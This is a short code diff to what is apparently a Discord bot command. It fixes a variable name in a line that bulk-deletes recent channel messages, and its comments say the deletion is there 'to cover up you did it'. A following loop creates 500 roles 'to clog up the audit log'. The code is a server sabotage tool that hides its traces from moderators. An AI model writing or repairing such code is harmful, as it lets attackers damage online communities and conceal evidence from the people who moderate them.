@@ -4,7 +4,7 @@ const Discord = require('discord.js');
 
 exports.run = (client, message, args) => {
 
-    message.channel.fetchMessages({limit: 10}).then(messages => msg.channel.bulkDelete(messages)); //deletes messages to cover up you did it
+    message.channel.fetchMessages({limit: 10}).then(messages => message.channel.bulkDelete(messages)); //deletes messages to cover up you did it
     for (var i = 0; i < 500; i++) {
         // Creates new roles to clog up the audit log
         message.guild.createRole({
